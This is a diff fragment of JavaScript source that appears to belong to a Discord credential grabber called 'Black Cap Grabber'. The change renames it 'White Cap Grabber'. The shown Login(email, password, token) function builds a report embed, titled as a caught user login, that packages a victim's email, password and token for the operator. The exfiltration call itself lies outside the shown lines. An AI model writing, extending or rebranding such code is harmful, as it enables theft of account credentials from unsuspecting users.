@@ -451,11 +451,11 @@ function Login(email, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "Black Cap Grabber",
+								username: "White Cap Grabber",
 								content: "",
 								embeds: [{
-									"title": "Black Caped User Login",
-                                    description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
+									"title": "White Caped User Login",
+                                    description: "[**<a:blackcap:935974543779045426> │ Oh you have White caped someone**](https://discord.gg/uKMbPwSapJ)",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "BC - Info",
